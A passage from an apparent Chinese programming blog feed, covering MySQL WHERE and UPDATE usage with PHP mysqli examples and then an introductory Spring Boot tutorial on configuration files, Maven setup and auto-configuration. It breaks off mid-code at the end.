runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        WHERE runoob_author=&quot;RUNOOB.COM&quot;&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL WHERE 子句测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">// 释放内存</span><br><span class="line">mysqli_free_result($retval);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="UPDATE-更新">UPDATE 更新</h3><p>如果我们需要修改或更新 MySQL 中的数据，我们可以使用 <strong>UPDATE</strong> 命令来操作。</p><p>以下是 UPDATE 命令修改 MySQL 数据表数据的通用 SQL 语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1 = value1, column2 = value2, ...</span><br><span class="line">WHERE condition;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p><code>table_name</code> 是你要更新数据的表的名称。</p></li><li><p><code>column1</code>, <code>column2</code>, … 是你要更新的列的名称。</p></li><li><p><code>value1</code>, <code>value2</code>, … 是新的值，用于替换旧的值。</p></li><li><p><code>WHERE condition</code> 是一个可选的子句，用于指定更新的行。如果省略 <code>WHERE</code> 子句，将更新表中的所有行。</p></li><li><p>你可以同时更新一个或多个字段。</p></li><li><p>你可以在 WHERE 子句中指定任何条件。</p></li><li><p>你可以在一个单独表中同时更新数据。</p></li></ul><p>实例</p><ol><li>更新单个列的值：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE employees</span><br><span class="line">SET salary = 60000</span><br><span class="line">WHERE employee_id = 101;</span><br></pre></td></tr></table></figure><ol start="2"><li>更新多个列的值：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE orders</span><br><span class="line">SET status = &#x27;Shipped&#x27;, ship_date = &#x27;2023-03-01&#x27;</span><br><span class="line">WHERE order_id = 1001;</span><br></pre></td></tr></table></figure><ol start="3"><li>使用表达式更新值：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE products</span><br><span class="line">SET price = price * 1.1</span><br><span class="line">WHERE category = &#x27;Electronics&#x27;;</span><br></pre></td></tr></table></figure><p>以上 SQL 语句将每个属于 ‘Electronics’ 类别的产品的价格都增加了 10%。</p><ol start="4"><li>更新符合条件的所有行：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE students</span><br><span class="line">SET status = &#x27;Graduated&#x27;;</span><br></pre></td></tr></table></figure><p>以上 SQL 语句将所有学生的状态更新为 ‘Graduated’。</p><ol start="5"><li>更新使用子查询的值：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UPDATE customers</span><br><span class="line">SET total_purchases = (</span><br><span class="line">    SELECT SUM(amount)</span><br><span class="line">    FROM orders</span><br><span class="line">    WHERE orders.customer_id = customers.customer_id</span><br><span class="line">)</span><br><span class="line">WHERE customer_type = &#x27;Premium&#x27;;</span><br></pre></td></tr></table></figure><p>以上 SQL 语句通过子查询计算每个 ‘Premium’ 类型客户的总购买金额，并将该值更新到 total_purchases 列中。</p><p>PHP脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;UPDATE runoob_tbl</span><br><span class="line">        SET runoob_title=&quot;学习 Python&quot;</span><br><span class="line">        WHERE runoob_id=3&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法更新数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据更新成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring boot(2)</title>
      <link href="/2024/07/04/springboot/"/>
      <url>/2024/07/04/springboot/</url>
      
        <content type="html"><![CDATA[<h1>Spring boot</h1><h2 id="第一个简单的spring-boot应用">第一个简单的spring boot应用</h2><p>spring boot简单的Maven目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">springboot-hello</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src</span><br><span class="line">│   └── main</span><br><span class="line">│       ├── java</span><br><span class="line">│       └── resources</span><br><span class="line">│           ├── application.yml</span><br><span class="line">│           ├── logback-spring.xml</span><br><span class="line">│           ├── static</span><br><span class="line">│           └── templates</span><br><span class="line">└── target</span><br></pre></td></tr></table></figure><p>其中，在<code>src/main/resources</code>目录下，注意到几个文件：</p><h3 id="application-yml">application.yml</h3><p>这是Spring Boot默认的配置文件，它采用<a href="https://yaml.org/">YAML</a>格式而不是<code>.properties</code>格式，文件名必须是<code>application.yml</code>而不是其他名称。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># application.yml</span><br><span class="line"></span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: $&#123;APP_NAME:unnamed&#125;</span><br><span class="line">  datasource:</span><br><span class="line">    url: jdbc:hsqldb:file:testdb</span><br><span class="line">    username: sa</span><br><span class="line">    password:</span><br><span class="line">    driver-class-name: org.hsqldb.jdbc.JDBCDriver</span><br><span class="line">    hikari:</span><br><span class="line">      auto-commit: false</span><br><span class="line">      connection-timeout: 3000</span><br><span class="line">      validation-timeout: 3000</span><br><span class="line">      max-lifetime: 60000</span><br><span class="line">      maximum-pool-size: 20</span><br><span class="line">      minimum-idle: 1</span><br></pre></td></tr></table></figure><p>可见，YAML是一种层级格式，它和<code>.properties</code>很容易互相转换，它的优点是去掉了大量重复的前缀，并且更加易读。</p><p>也可以使用application.properties作为配置文件，但不如YAML格式简单。</p><h3 id="使用环境变量">使用环境变量</h3><p>在配置文件中，我们经常使用如下的格式对某个key进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app:</span><br><span class="line">  db:</span><br><span class="line">    host: $&#123;DB_HOST:localhost&#125;</span><br><span class="line">    user: $&#123;DB_USER:root&#125;</span><br><span class="line">    password: $&#123;DB_PASSWORD:password&#125;</span><br><span class="line">    #简单的数据库配置</span><br></pre></td></tr></table></figure><p>这种<code>$&#123;DB_HOST:localhost&#125;</code>意思是，首先从环境变量查找<code>DB_HOST</code>，如果环境变量定义了，那么使用环境变量的值，否则，使用默认值<code>localhost</code>。</p><p>这使得我们在开发和部署时更加方便，因为开发时无需设定任何环境变量，直接使用默认值即本地数据库，而实际线上运行的时候，只需要传入环境变量即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ DB_HOST=10.0.1.123 DB_USER=prod DB_PASSWORD=xxxx java -jar xxx.jar</span><br></pre></td></tr></table></figure><h3 id="logback-spring-xml">logback-spring.xml</h3><p>这是Spring Boot的logback配置文件名称（也可以使用<code>logback.xml</code>），一个标准的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;include resource=&quot;org/springframework/boot/logging/logback/defaults.xml&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;appender name=&quot;CONSOLE&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class="line">        &lt;encoder&gt;</span><br><span class="line">            &lt;pattern&gt;$&#123;CONSOLE_LOG_PATTERN&#125;&lt;/pattern&gt;</span><br><span class="line">            &lt;charset&gt;utf8&lt;/charset&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;appender name=&quot;APP_LOG&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class="line">        &lt;encoder&gt;</span><br><span class="line">            &lt;pattern&gt;$&#123;FILE_LOG_PATTERN&#125;&lt;/pattern&gt;</span><br><span class="line">            &lt;charset&gt;utf8&lt;/charset&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line">          &lt;file&gt;app.log&lt;/file&gt;</span><br><span class="line">        &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.FixedWindowRollingPolicy&quot;&gt;</span><br><span class="line">            &lt;maxIndex&gt;1&lt;/maxIndex&gt;</span><br><span class="line">            &lt;fileNamePattern&gt;app.log.%i&lt;/fileNamePattern&gt;</span><br><span class="line">        &lt;/rollingPolicy&gt;</span><br><span class="line">        &lt;triggeringPolicy class=&quot;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&quot;&gt;</span><br><span class="line">            &lt;MaxFileSize&gt;1MB&lt;/MaxFileSize&gt;</span><br><span class="line">        &lt;/triggeringPolicy&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;root level=&quot;INFO&quot;&gt;</span><br><span class="line">        &lt;appender-ref ref=&quot;CONSOLE&quot; /&gt;</span><br><span class="line">        &lt;appender-ref ref=&quot;APP_LOG&quot; /&gt;</span><br><span class="line">    &lt;/root&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>它主要通过<code>&lt;include resource=&quot;...&quot; /&gt;</code>引入了Spring Boot的一个缺省配置，这样我们就可以引用类似<code>$&#123;CONSOLE_LOG_PATTERN&#125;</code>这样的变量。上述配置定义了一个控制台输出和文件输出，可根据需要修改。</p><p><code>static</code>是静态文件目录，<code>templates</code>是模板文件目录，注意它们不再存放在<code>src/main/webapp</code>下，而是直接放到<code>src/main/resources</code>这个classpath目录，因为在Spring Boot中已经不需要专门的webapp目录了。</p><h3 id="源码目录结构：">源码目录结构：</h3><h4 id="启动主类">启动主类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">src/main/java</span><br><span class="line">└── com</span><br><span class="line">    └── itranswarp</span><br><span class="line">        └── learnjava</span><br><span class="line">            ├── Application.java</span><br><span class="line">            ├── entity</span><br><span class="line">            │   └── User.java</span><br><span class="line">            ├── service</span><br><span class="line">            │   └── UserService.java</span><br><span class="line">            └── web</span><br><span class="line">                └── UserController.java</span><br></pre></td></tr></table></figure><p>在存放源码的<code>src/main/java</code>目录中，Spring Boot对Java包的层级结构有一个要求。注意到我们的根package是<code>com.itranswarp.learnjava</code>，下面还有<code>entity</code>、<code>service</code>、<code>web</code>等子package。Spring Boot要求<code>main()</code>方法所在的启动类必须放到根package下，命名不做要求，这里我们以<code>Application.java</code>命名，它的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">public class Application &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动Spring Boot应用程序只需要一行代码加上一个注解<code>@SpringBootApplication</code>，该注解实际上又包含了：</p><ul><li>@SpringBootConfiguration<ul><li>@Configuration</li></ul></li><li>@EnableAutoConfiguration<ul><li>@AutoConfigurationPackage</li></ul></li><li>@ComponentScan</li></ul><h4 id="pom-xml">pom.xml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;project ...&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.0.0&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;groupId&gt;com.itranswarp.learnjava&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;springboot-hello&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;17&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;17&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;java.version&gt;17&lt;/java.version&gt;</span><br><span class="line">        &lt;pebble.version&gt;3.2.0&lt;/pebble.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 集成Pebble View --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;io.pebbletemplates&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;pebble-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;pebble.version&#125;&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- JDBC驱动 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.hsqldb&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hsqldb&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p>使用Spring Boot时，强烈推荐从<code>spring-boot-starter-parent</code>继承，因为这样就可以引入Spring Boot的预置配置。</p><p>紧接着，我们引入了依赖<code>spring-boot-starter-web</code>和<code>spring-boot-starter-jdbc</code>，它们分别引入了Spring MVC相关依赖和Spring JDBC相关依赖，无需指定版本号，因为引入的<code>&lt;parent&gt;</code>内已经指定了，只有我们自己引入的某些第三方jar包需要指定版本号。这里我们引入<code>pebble-spring-boot-starter</code>作为View，以及<code>hsqldb</code>作为嵌入式数据库。<code>hsqldb</code>已在<code>spring-boot-starter-jdbc</code>中预置了版本号<code>3.0.0</code>，因此此处无需指定版本号。</p><p>根据<code>pebble-spring-boot-starter</code>的<a href="https://pebbletemplates.io/wiki/guide/spring-boot-integration/">文档</a>，加入如下配置到<code>application.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pebble:</span><br><span class="line">  # 默认为&quot;.peb&quot;，改为&quot;&quot;:</span><br><span class="line">  suffix:</span><br><span class="line">  # 开发阶段禁用模板缓存:</span><br><span class="line">  cache: false</span><br></pre></td></tr></table></figure><p>对<code>Application</code>稍作改动，添加<code>WebMvcConfigurer</code>这个Bean：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">public class Application &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    WebMvcConfigurer createWebMvcConfigurer(@Autowired HandlerInterceptor[] interceptors) &#123;</span><br><span class="line">        return new WebMvcConfigurer() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void addResourceHandlers(ResourceHandlerRegistry registry) &#123;</span><br><span class="line">                // 映射路径`/static/`到classpath路径:</span><br><span class="line">                registry.addResourceHandler(&quot;/static/**&quot;)</span><br><span class="line">                        .addResourceLocations(&quot;classpath:/static/&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">   </span><br></pre></td></tr></table></figure><h4 id="日志">日志</h4><p>启动后观察日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  .   ____          _            __ _ _</span><br><span class="line"> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \</span><br><span class="line">( ( )\___ | &#x27;_ | &#x27;_| | &#x27;_ \/ _` | \ \ \ \</span><br><span class="line"> \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class="line">  &#x27;  |____| .__|_| |_|_| |_\__, | / / / /</span><br><span class="line"> =========|_|==============|___/=/_/_/_/</span><br><span class="line"> :: Spring Boot ::                (v3.0.0)</span><br><span class="line"></span><br><span class="line">2022-11-25T10:49:31.100+08:00  INFO 13105 --- [           main] com.itranswarp.learnjava.Application     : Starting Application using Java 17 with PID 13105 (/Users/liaoxuefeng/Git/springboot-hello/target/classes started by liaoxuefeng in /Users/liaoxuefeng/Git/springboot-hello)</span><br><span class="line">2022-11-25T10:49:31.107+08:00  INFO 13105 --- [           main] com.itranswarp.learnjava.Application     : No active profile set, falling back to 1 default profile: &quot;default&quot;</span><br><span class="line">2022-11-25T10:49:32.404+08:00  INFO 13105 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)</span><br><span class="line">2022-11-25T10:49:32.423+08:00  INFO 13105 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]</span><br><span class="line">2022-11-25T10:49:32.426+08:00  INFO 13105 --- [           main] o.apache.catalina.core.StandardEngine    : Starting Servlet engine: [Apache Tomcat/10.1.1]</span><br><span class="line">2022-11-25T10:49:32.549+08:00  INFO 13105 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext</span><br><span class="line">2022-11-25T10:49:32.551+08:00  INFO 13105 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1327 ms</span><br><span class="line">2022-11-25T10:49:32.668+08:00  WARN 13105 --- [           main] com.zaxxer.hikari.HikariConfig           : HikariPool-1 - idleTimeout is close to or more than maxLifetime, disabling it.</span><br><span class="line">2022-11-25T10:49:32.669+08:00  INFO 13105 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...</span><br><span class="line">2022-11-25T10:49:32.996+08:00  INFO 13105 --- [           main] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Driver does not support get/set network timeout for connections. (feature not supported)</span><br><span class="line">2022-11-25T10:49:32.998+08:00  INFO 13105 --- [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-1 - Added connection org.hsqldb.jdbc.JDBCConnection@31a2a9fa</span><br><span class="line">2022-11-25T10:49:33.002+08:00  INFO 13105 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.</span><br><span class="line">2022-11-25T10:49:33.391+08:00  WARN 13105 --- [           main] ocalVariableTableParameterNameDiscoverer : Using deprecated &#x27;-debug&#x27; fallback for parameter name resolution. Compile the affected code with &#x27;-parameters&#x27; instead or avoid its introspection: io.pebbletemplates.boot.autoconfigure.PebbleServletWebConfiguration</span><br><span class="line">2022-11-25T10:49:33.398+08:00  WARN 13105 --- [           main] ocalVariableTableParameterNameDiscoverer : Using deprecated &#x27;-debug&#x27; fallback for parameter name resolution. Compile the affected code with &#x27;-parameters&#x27; instead or avoid its introspection: io.pebbletemplates.boot.autoconfigure.PebbleAutoConfiguration</span><br><span class="line">2022-11-25T10:49:33.619+08:00  INFO 13105 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path &#x27;&#x27;</span><br><span class="line">2022-11-25T10:49:33.637+08:00  INFO 13105 --- [           main] com.itranswarp.learnjava.Application     : Started Application in 3.151 seconds (process running for 3.835)</span><br></pre></td></tr></table></figure><p>Spring Boot自动启动了嵌入式Tomcat，当看到<code>Started Application in xxx seconds</code>时，Spring Boot应用启动成功。</p><p>我们在浏览器输入<code>localhost:8080</code>就可以直接访问页面。</p><p>Spring Boot的特色：AutoConfiguration</p><p>当我们引入<code>spring-boot-starter-jdbc</code>时，启动时会自动扫描所有的<code>XxxAutoConfiguration</code>：</p><ul><li><code>DataSourceAutoConfiguration</code>：自动创建一个<code>DataSource</code>，其中配置项从<code>application.yml</code>的<code>spring.datasource</code>读取；</li><li><code>DataSourceTransactionManagerAutoConfiguration</code>：自动创建了一个基于JDBC的事务管理器；</li><li><code>JdbcTemplateAutoConfiguration</code>：自动创建了一个<code>JdbcTemplate</code>。</li></ul><p>因此，我们自动得到了一个<code>DataSource</code>、一个<code>DataSourceTransactionManager</code>和一个<code>JdbcTemplate</code>。</p><p>类似的，当我们引入<code>spring-boot-starter-web</code>时，自动创建了：</p><ul><li><code>ServletWebServerFactoryAutoConfiguration</code>：自动创建一个嵌入式Web服务器，默认是Tomcat；</li><li><code>DispatcherServletAutoConfiguration</code>：自动创建一个<code>DispatcherServlet</code>；</li><li><code>HttpEncodingAutoConfiguration</code>：自动创建一个<code>CharacterEncodingFilter</code>；</li><li><code>WebMvcAutoConfiguration</code>：自动创建若干与MVC相关的Bean。</li><li>…</li></ul><p>引入第三方<code>pebble-spring-boot-starter</code>时，自动创建了：</p><ul><li><code>PebbleAutoConfiguration</code>：自动创建了一个<code>PebbleViewResolver</code>。</li></ul><p>Spring Boot大量使用<code>XxxAutoConfiguration</code>来使得许多组件被自动化配置并创建，而这些创建过程又大量使用了Spring的Conditional功能。例如，我们观察<code>JdbcTemplateAutoConfiguration</code></p><p>如果我们自己创建了一个<code>JdbcTemplate</code>，例如，在<code>Application</code>中自己写个方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">public class Application &#123;</span><br><span class="line">    ...</span><br><span class="line">    @Bean</span><br><span class="line">    JdbcTemplate createJdbcTemplate(@Autowired DataSource dataSource) &#123;</span><br><span class="line">        return new 